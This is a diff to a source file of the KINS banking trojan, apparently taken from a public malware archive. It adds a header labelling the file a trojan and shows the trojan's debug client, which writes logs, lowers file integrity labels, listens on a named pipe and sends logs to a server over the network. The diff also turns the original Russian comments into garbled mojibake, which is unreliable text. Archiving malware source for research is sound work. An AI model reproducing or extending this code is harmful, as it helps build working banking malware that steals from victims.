@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlwapi.h>
 #include <shlobj.h>
@@ -39,27 +50,27 @@ static DWORD integrityLevel;
 #pragma pack(push, 1)
 typedef struct
 {
-  BYTE bDataType;     //Тип отчета.
+  BYTE bDataType;     //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  DWORD dwLastError;  //Значение GetLastError() на момент вызова.
+  DWORD dwLastError;  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ GetLastError() пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   DWORD dwPID;        //PID
   DWORD dwTID;        //TID
   DWORD dwTickCount;  //GetTickCount()
 
-  char strFunctionName[50]; //UTF-8. Имя функции, думаю 50 байт будет достаточно.
-  char strSourceFile[80];   //UTF-8. Имя исходного файла.
-  DWORD dwLineNumber;       //Номер строки в исходном файле.
+  char strFunctionName[50]; //UTF-8. пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ 50 пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  char strSourceFile[80];   //UTF-8. пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+  DWORD dwLineNumber;       //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 }DEBUGDATA;
 #pragma pack(pop)
 
-//Открытия файла отчетов.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 static HANDLE OpenLogFile(void)
 {
 #if(BO_DEBUG == 1)
   WinSecurity::_setLowIntegrityLevelLabel(__strDebugReportFile, SE_FILE_OBJECT, false);
   HANDLE file = CWA(kernel32, CreateFileW)(__strDebugReportFile, GENERIC_WRITE | WRITE_DAC, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
-  //Альтернативный путь
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
   WCHAR path[MAX_PATH];
   if(file == INVALID_HANDLE_VALUE && (integrityLevel == Process::INTEGRITY_UNKNOWN || integrityLevel == Process::INTEGRITY_HIGH))
   {
@@ -70,7 +81,7 @@ static HANDLE OpenLogFile(void)
     file = CWA(kernel32, CreateFileW)(path, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
   }
 
-  //Пишим BOM
+  //пїЅпїЅпїЅпїЅпїЅ BOM
   if(file != INVALID_HANDLE_VALUE)
   {
     LARGE_INTEGER li;
@@ -119,7 +130,7 @@ void DebugClient::WriteString(LPSTR pstrFuncName, LPSTR pstrSourceFile, DWORD dw
   DEBUGDATA Data;
   SYSTEMTIME lt;
 
-  //Заполняем структуру.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   Mem::_zero(&Data, sizeof(DEBUGDATA));
   Data.dwLastError   = CWA(kernel32, GetLastError)();
   Data.bDataType     = bType;
@@ -130,7 +141,7 @@ void DebugClient::WriteString(LPSTR pstrFuncName, LPSTR pstrSourceFile, DWORD dw
 
   CWA(kernel32, GetLocalTime)(&lt);
                           
-  //Имя функции.
+  //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   DWORD dwSize = pstrFuncName ? Str::_LengthA(pstrFuncName) : 0;
   if(dwSize > 0)
   {
@@ -138,7 +149,7 @@ void DebugClient::WriteString(LPSTR pstrFuncName, LPSTR pstrSourceFile, DWORD dw
     Str::_CopyA(Data.strFunctionName, pstrFuncName, min((sizeof(Data.strFunctionName) / sizeof(char)), dwSize));
   }
 
-  //Исходный файл.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   dwSize = pstrSourceFile ? Str::_LengthA(pstrSourceFile) : 0;
   if(dwSize > 0)
   {
@@ -146,13 +157,13 @@ void DebugClient::WriteString(LPSTR pstrFuncName, LPSTR pstrSourceFile, DWORD dw
     Str::_CopyA(Data.strSourceFile, pstrSourceFile, min((sizeof(Data.strSourceFile) / sizeof(char)), dwSize));
   }
 
-  //Создаем отчет.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   Str::UTF8STRING u8str;
   bool utf8_ok = false;
   {
     LPWSTR pTmpBuffer = (LPWSTR)Mem::alloc(LOG_BUFFER_SIZE * sizeof(WCHAR));
 
-    //Строка по умолчанию.
+    //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     #define ERROR_STR "FAILED TO ALLOCATE STRING."
     
     char def_str[sizeof(ERROR_STR)];
@@ -166,7 +177,7 @@ void DebugClient::WriteString(LPSTR pstrFuncName, LPSTR pstrSourceFile, DWORD dw
 
     if(pTmpBuffer)
     {
-      //Заголовок.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       int iSysSize = Str::_sprintfW(pTmpBuffer, 250,
                                     L"[%02u:%02u:%02u] TC=%010u, PID=%04u(0x%04X), TID=%04u(0x%04X), LE=%u(0x%X), F=%S, FL=%S (%u)\r\n%S: ",
                                     lt.wHour, lt.wMinute, lt.wSecond, Data.dwTickCount, Data.dwPID, Data.dwPID, Data.dwTID, Data.dwTID,
@@ -174,7 +185,7 @@ void DebugClient::WriteString(LPSTR pstrFuncName, LPSTR pstrSourceFile, DWORD dw
                                     Data.strFunctionName, Data.strSourceFile, Data.dwLineNumber,
                                     (bType < sizeof(WDDType) / sizeof(LPSTR) ? WDDType[bType] : "-"));
 
-      //Лог.
+      //пїЅпїЅпїЅ.
       if(iSysSize > 0)
       {
         va_list list;
@@ -182,7 +193,7 @@ void DebugClient::WriteString(LPSTR pstrFuncName, LPSTR pstrSourceFile, DWORD dw
         int iLogSize =  Str::_vsprintfW(pTmpBuffer + iSysSize, LOG_BUFFER_SIZE - iSysSize, pstrFormat, list);
         va_end(list);
 
-        //Конвертируем в UTF-8.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ UTF-8.
         if(iLogSize > 0)utf8_ok = Str::_utf8FromUnicode(pTmpBuffer, iSysSize + iLogSize, &u8str);
       }
 
@@ -193,7 +204,7 @@ void DebugClient::WriteString(LPSTR pstrFuncName, LPSTR pstrSourceFile, DWORD dw
   HANDLE hMutex = Sync::_waitForMutex(SecurityOK ? &saFullAccess : NULL, MUTEX_WRITEFILE);
   if(hMutex)
   {
-    //Запись в файл.
+    //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ.
     HANDLE hFile = OpenLogFile();
     if(hFile != INVALID_HANDLE_VALUE)
     {
@@ -240,7 +251,7 @@ static DWORD WINAPI SentLogsToServer(void *)
     {
       CWA(kernel32, EnterCriticalSection)(&csLogs);
       
-      //Ищим следующий лог.
+      //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
       DWORD dwMin = (DWORD)-1;
       DWORD dwIndex = (DWORD)-1;
       LOGDATA *pld = NULL;
@@ -251,7 +262,7 @@ static DWORD WINAPI SentLogsToServer(void *)
         dwIndex = i;
       }
 
-      //Отправляем лог.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
       if(dwIndex != (DWORD)-1)
       {
         Wininet::CALLURLDATA cud;
@@ -296,11 +307,11 @@ void DebugClient::StartLogServer(void)
     pLogs       = NULL;
     dwLogsCount = 0;
 
-    //Создаем пайп.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
     HANDLE hPipe = CWA(kernel32, CreateNamedPipeW)(__strDebugReportFile, PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_WAIT | PIPE_READMODE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 1024, 1024, NMPWAIT_USE_DEFAULT_WAIT, NULL);
     if(hPipe != INVALID_HANDLE_VALUE)
     {
-      //Создаем поток для оправки логов.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
       HANDLE hThread = CWA(kernel32, CreateThread)(NULL, 0, SentLogsToServer, NULL, 0, NULL);
       if(hThread)
       {
@@ -308,7 +319,7 @@ void DebugClient::StartLogServer(void)
         
         DWORD dwCurLogPos = 1;
         
-        //Ждем подключения.
+        //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         while(CWA(kernel32, ConnectNamedPipe)(hPipe, NULL) ? 1 : (CWA(kernel32, GetLastError)() == ERROR_PIPE_CONNECTED ? 1 : 0))
         {
           DWORD dwReaded;
